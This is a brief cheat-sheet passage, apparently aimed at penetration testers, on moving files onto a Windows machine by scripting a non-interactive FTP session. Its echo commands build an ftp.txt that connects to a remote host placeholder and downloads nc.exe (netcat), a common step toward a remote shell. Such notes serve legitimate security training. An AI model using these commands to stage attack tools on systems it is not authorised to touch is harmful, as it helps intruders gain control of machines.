If you have access to a ftp-client you can of course just use that. Remember, if you are uploading binaries you must use binary mode, otherwise the binary will become corrupted!!!


Issuing commands from an ftp.txt
echo open <RHOST> 21 > ftp.txt
echo USER <USER> >> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt

Initiate the connection and run all commands in file:
ftp -v -n -s:ftp.txt
